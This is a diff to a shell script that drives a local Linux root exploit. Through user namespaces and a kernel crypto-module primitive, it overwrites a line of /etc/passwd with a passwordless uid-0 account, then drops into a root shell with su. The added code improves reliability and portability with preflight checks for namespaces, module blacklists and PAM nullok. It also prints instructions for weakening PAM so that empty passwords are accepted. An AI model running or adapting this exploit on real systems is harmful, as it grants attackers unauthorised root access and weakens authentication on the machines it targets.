@@ -3,24 +3,98 @@
 # drops you into its shell. No SUID helper, no auto-restore.
 #
 # Overwrites a system /etc/passwd line (mail/games/etc, longest line
-# with a nologin/false shell) with `sick::0:0:<pad>:/:/bin/bash` —
+# with a nologin/false/sync shell) with `sick::0:0:<pad>:/:<root-shell>` —
 # length-matched, valid 7-field entry, empty password field. PAM
-# pam_unix.so nullok accepts empty input password.
+# pam_unix.so nullok accepts empty input password. Shell path and
+# victim-line shell match are auto-derived so non-FHS distros (NixOS,
+# Guix, Gobo) work without manual edits.
 #
 # Usage:
 #   ./run.sh           install + drop into root shell
 #   ./run.sh --clean   undo the install (revert /etc/passwd via the same primitive)
+#   ./run.sh --check   pre-flight checks only (no modifications)
 
 set -u
 HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
 STATE=/var/tmp/.cf2.state
 NEW_USER=sick
 PREFIX="${NEW_USER}::0:0:"
-SUFFIX=":/:/bin/bash"
 
-red()   { printf '\033[31m%s\033[0m\n' "$*" >&2; }
-green() { printf '\033[32m%s\033[0m\n' "$*"; }
-blue()  { printf '\033[34m=== %s\033[0m\n' "$*"; }
+# Derive the SUFFIX shell from root's actual /etc/passwd entry so we match
+# whatever path layout the distro uses (NixOS = /run/current-system/sw/bin/bash,
+# others = /bin/bash). Falls back to /bin/bash if root's shell can't be parsed.
+ROOT_SHELL=$(awk -F: '$1=="root" {print $7; exit}' /etc/passwd 2>/dev/null)
+[ -n "$ROOT_SHELL" ] || ROOT_SHELL=/bin/bash
+SUFFIX=":/:${ROOT_SHELL}"
+
+red()    { printf '\033[31m%s\033[0m\n' "$*" >&2; }
+green()  { printf '\033[32m%s\033[0m\n' "$*"; }
+blue()   { printf '\033[34m=== %s\033[0m\n' "$*"; }
+yellow() { printf '\033[33m%s\033[0m\n' "$*" >&2; }
+
+# ---------- preflight ----------
+distro_id() {
+    [ -r /etc/os-release ] && ( . /etc/os-release && echo "${ID:-unknown}" ) || echo unknown
+}
+
+# CONFIG_USER_NS off (e.g. SlicerVM/Firecracker minimal kernels) → no exploit.
+check_userns() {
+    [ -e /proc/self/ns/user ] || { red "no user namespaces (CONFIG_USER_NS=n)"; return 1; }
+    if [ -r /proc/sys/kernel/unprivileged_userns_clone ] && \
+       [ "$(cat /proc/sys/kernel/unprivileged_userns_clone)" = 0 ]; then
+        red "kernel.unprivileged_userns_clone=0"; return 1
+    fi
+    return 0
+}
+
+# dirtyfrag-style modprobe blacklist on esp4/esp6/rxrpc kills the primitive.
+check_xfrm() {
+    if grep -qE '^[[:space:]]*(install|blacklist)[[:space:]]+(esp4|esp6|rxrpc)' \
+        /etc/modprobe.d/*.conf /etc/modprobe.conf /usr/lib/modprobe.d/*.conf \
+        /run/modprobe.d/*.conf 2>/dev/null; then
+        red "esp4/esp6/rxrpc blacklisted (dirtyfrag-style mitigation)"; return 1
+    fi
+    if ! [ -d /sys/module/esp4 ] && ! modprobe -n esp4 >/dev/null 2>&1; then
+        red "esp4 module not buildable on this kernel (CONFIG_INET_ESP off?)"; return 1
+    fi
+    return 0
+}
+
+# The passwd-flip payload only completes if PAM accepts an empty password
+# (pam_unix.so nullok). NixOS doesn't ship that by default.
+check_pam_nullok() {
+    # Strip comments (#-prefixed lines) before checking, otherwise commented-out
+    # nullok references give a false positive.
+    {
+        cat /etc/pam.d/* /etc/pam.conf 2>/dev/null
+        cat /etc/pam.d/*/* 2>/dev/null
+    } | grep -vE '^[[:space:]]*#' \
+      | grep -qE 'pam_unix\.so[[:space:]][^#]*\bnullok\b'
+}
+
+preflight() {
+    local d=$(distro_id) ok=1
+    blue "Preflight ($d, $(uname -r))"
+    check_userns || ok=0
+    check_xfrm || ok=0
+    if ! check_pam_nullok; then
+        ok=0
+        red "PAM does not accept empty passwords (no pam_unix.so nullok in /etc/pam.d/)"
+        case "$d" in
+            nixos)
+                yellow "  → enable in NixOS:"
+                yellow "      security.pam.services.su.allowNullPassword = true;"
+                yellow "      sudo nixos-rebuild switch"
+                ;;
+            *)
+                yellow "  → add 'nullok' to the auth pam_unix.so line in /etc/pam.d/su"
+                yellow "    (or system-auth / common-auth, depending on distro)"
+                ;;
+        esac
+    fi
+    [ "$ok" = 1 ] && green "[+] preflight OK"
+    return $((1 - ok))
+}
 
 # Userns harness — try plain unshare first, fall back to aa-rootns.
 # Probe must actually grant CAP_NET_ADMIN (Ubuntu apparmor_restrict_unprivileged_userns
@@ -69,6 +143,11 @@ flip_range() {
         "${USNS[@]}" "$HERE/copyfail2" /etc/passwd "$off" "$t" >/dev/null
     done
 }
+
+# ---------- --check ----------
+if [ "${1:-}" = "--check" ]; then
+    preflight; exit $?
+fi
 
 # ---------- --clean ----------
 if [ "${1:-}" = "--clean" ] || [ "${1:-}" = "-c" ]; then
@@ -131,21 +210,28 @@ if getent passwd "$NEW_USER" | grep -q "^${NEW_USER}::0:0:"; then
     exec su - "$NEW_USER"
 fi
 
+preflight || exit 1
+
 setup_usns
 build_helper
 
 getent passwd "$NEW_USER" >/dev/null \
     && { red "'$NEW_USER' already exists in passwd with non-uid-0 entry — pick a different NEW_USER"; exit 1; }
 
-# Pick the longest /etc/passwd line whose shell is nologin/false/sync.
+# Pick the longest /etc/passwd line whose shell basename is nologin/false/sync.
+# Match by basename (not full path) so distros with non-FHS layouts work
+# (NixOS, GoboLinux, Guix, etc.).
 VICTIM_LINE=$(awk -F: '
-    $NF == "/usr/sbin/nologin" || $NF == "/sbin/nologin" ||
-    $NF == "/bin/false" || $NF == "/usr/bin/false" || $NF == "/bin/sync" {
-        if (length($0) > maxlen) { maxlen = length($0); maxline = $0 }
+    {
+        n = split($NF, parts, "/")
+        base = parts[n]
+        if (base == "nologin" || base == "false" || base == "sync") {
+            if (length($0) > maxlen) { maxlen = length($0); maxline = $0 }
+        }
     }
     END { print maxline }
 ' /etc/passwd)
-[ -n "$VICTIM_LINE" ] || { red "no victim line found in /etc/passwd"; exit 1; }
+[ -n "$VICTIM_LINE" ] || { red "no victim line found in /etc/passwd (no nologin/false/sync shell entry long enough)"; exit 1; }
 VICTIM_NAME=${VICTIM_LINE%%:*}
 VICTIM_LEN=${#VICTIM_LINE}
 
